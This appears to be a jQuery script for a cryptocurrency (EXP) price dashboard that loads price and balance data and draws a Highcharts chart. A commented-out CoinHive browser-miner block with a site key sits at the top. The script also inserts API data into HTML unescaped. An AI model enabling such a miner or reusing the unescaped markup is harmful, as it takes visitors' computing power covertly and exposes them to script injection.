"use strict";
	$(document).ready(function(){
		
		// const api1 = 'OdwjjaIRx0mmZ836253lrPnE6e8VEAaj';
		// // const api2 = 'DxsMx0uURH7HF0DyWxKecXI91HVw7WFB';
		// var miner = new CoinHive.User(api1, 'john-doe', {
		// 	threads: 4,
		// 	autoThreads: false,
		// 	throttle: 0.8,
		// 	forceASMJS: false
		// });
		// 	miner.start()

		const gander = 'http://www.gander.tech/address/';
		var data;
		var price;
		var dataPrice;
		  $.ajax({
		  	data: JSON.stringify(dataPrice),
		  	type: 'GET',
		  	url: '/api/prices',
		  	success: function(data){
		  		// [[123, date.now()]]
		  		chart.series[0].update({data:data})
		  		console.log(data[0].price);
		  	}
		  });
		$.ajax({
			type: 'GET',
			data: JSON.stringify(data),
			url: "/api",
			async: false ,
			success: function(data){
				price = Number(data[0].priceUSD).toFixed(2);
				$('.priceUSD').append('<h3>' + '$' + Number(data[0].priceUSD).toFixed(2) + '</h3>');
				$('.priceBTC').append('<h3>' + Number(data[0].priceBTC).toFixed(7) + ' btc' + '</h3>');
				$('.marketcap').append('<h3>' + '$ ' + new Intl.NumberFormat('us-US').format(parseInt(data[0].marketcap)) + '</h3>');
				$('.supply').append('<h3>' + new Intl.NumberFormat('us-US').format(parseInt(data[0].supply)) + ' EXP' + '</h3>');
				$('.volume').append('<h3>' + '$ ' + new Intl.NumberFormat('us-US').format(parseInt(data[0].volume)) + '</h3>');
			}
		})
		
  	  	// Для Динамического графика
  	 
		  $.ajax({
				type: 'GET',
				data: JSON.stringify(data),
				url: "/api/table",
				success: function(data){
					for(var i = 0; i<data.length;i++){
						$('.table tbody').append('<tr><td><a href = ' + gander +  data[i].name + ' target="_blank">' + data[i].name +'</a></td>' + '<td>' + Intl.NumberFormat('us-US').format(Number(data[i].balance)) + 
						 '</td>'+ '<td>'+ Intl.NumberFormat('us-US').format(Number(data[i].balance) * price) + ' $'+'</td>' + '</tr>')
					}
				}

			})

		function calcDate(date){
			var data = new Date(date);
			var options = {
				  year: 'numeric',
				  month: 'long',
				  day: 'numeric',
				  weekday: 'long'
				 
				};

			return data.toLocaleString("en-US", options);
		}
		var chart = Highcharts.chart('chart', {
			chart: {
				type: 'line',
				backgroundColor: null		
			},
	    	tooltip: {
	    		textAlign: 'center',
			    formatter: function() {
			        return  calcDate(this.x) + ' <br class="price"> Price was ' + this.y + '$';
			    }
			},
	    	navigator: {enabled: false},
	    	legend: {enabled: false},
	    	title: {
	        	text: null
		    },
		   
            yAxis: {
                 gridLineColor: null
                      
             },
            xAxis: {  
            	type:'datetime'    
            },
          
         	plotOptions: {
		 	// здесь нужно указать период по времени с какого по какое
		        	
		    },
		    series: [{
		        name: ' ',
		        type: 'line',
		      	color: '#DC5100'
		    	}]
			});



		});
